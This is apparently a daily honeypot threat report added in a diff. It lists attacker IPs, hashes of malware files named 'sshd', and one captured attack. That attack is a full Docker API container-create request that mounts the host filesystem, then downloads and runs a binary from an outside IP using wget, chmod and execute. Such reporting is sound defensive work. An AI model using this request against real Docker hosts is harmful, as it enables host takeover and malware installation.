@@ -1,0 +1,34 @@
+Top 5 IPs for 07-10-2024 :
+
+164.163.98.28
+111.67.193.179
+203.89.231.47
+47.158.120.202
+154.212.141.193
+
+Malware Observed:
+
+File name : sshd
+51b052a524af278366fb5527d4a5eee949b63f85168c37d4f97aefe3e73fe66a
+https://www.virustotal.com/gui/file/51b052a524af278366fb5527d4a5eee949b63f85168c37d4f97aefe3e73fe66a
+ 
+File name : sshd
+6869ce81729acda83597601eb7c89c0bdda23d41bd5fe6900256dfb389a9bf47
+https://www.virustotal.com/gui/file/6869ce81729acda83597601eb7c89c0bdda23d41bd5fe6900256dfb389a9bf47
+
+File name : sshd
+6ef27a778205b49344615af4c6983ebe2ac8fe89738eb44c202fdefb0fb40cc9
+https://www.virustotal.com/gui/file/6ef27a778205b49344615af4c6983ebe2ac8fe89738eb44c202fdefb0fb40cc9
+
+
+Commands/exploits observed :
+
+
+POST /v1.24/containers/create HTTP/1.1
+Host: <Host IP>
+User-Agent: Go-http-client/1.1
+Content-Length: 1584
+Accept-Encoding: gzip
+Content-Type: application/json
+
+{"Hostname":"","Domainname":"","User":"","AttachStdin":false,"AttachStdout":true,"AttachStderr":true,"Tty":false,"OpenStdin":false,"StdinOnce":false,"Env":null,"Cmd":["chroot","/mnt/","/bin/sh","-c","wget http://172.235.166.240/.Sx86; chmod 777 .Sx86; ./.Sx86 0dayx86"],"Image":"alpine","Volumes":{},"WorkingDir":"","Entrypoint":null,"OnBuild":null,"Labels":{},"HostConfig":{"Binds":["/:/mnt"],"ContainerIDFile":"","LogConfig":{"Type":"","Config":{}},"NetworkMode":"default","PortBindings":{},"RestartPolicy":{"Name":"no","MaximumRetryCount":0},"AutoRemove":false,"VolumeDriver":"","VolumesFrom":null,"ConsoleSize":[0,0],"CapAdd":null,"CapDrop":null,"CgroupnsMode":"","Dns":[],"DnsOptions":[],"DnsSearch":[],"ExtraHosts":null,"GroupAdd":null,"IpcMode":"","Cgroup":"","Links":null,"OomScoreAdj":0,"PidMode":"","Privileged":false,"PublishAllPorts":false,"ReadonlyRootfs":false,"SecurityOpt":null,"UTSMode":"","UsernsMode":"","ShmSize":0,"Isolation":"","CpuShares":0,"Memory":0,"NanoCpus":0,"CgroupParent":"","BlkioWeight":0,"BlkioWeightDevice":null,"BlkioDeviceReadBps":null,"BlkioDeviceWriteBps":null,"BlkioDeviceReadIOps":null,"BlkioDeviceWriteIOps":null,"CpuPeriod":0,"CpuQuota":0,"CpuRealtimePeriod":0,"CpuRealtimeRuntime":0,"CpusetCpus":"","CpusetMems":"","Devices":null,"DeviceCgroupRules":null,"DeviceRequests":null,"MemoryReservation":0,"MemorySwap":0,"MemorySwappiness":-1,"OomKillDisable":false,"PidsLimit":0,"Ulimits":null,"CpuCount":0,"CpuPercent":0,"IOMaximumIOps":0,"IOMaximumBandwidth":0,"MaskedPaths":null,"ReadonlyPaths":null},"NetworkingConfig":{"EndpointsConfig":{}}}
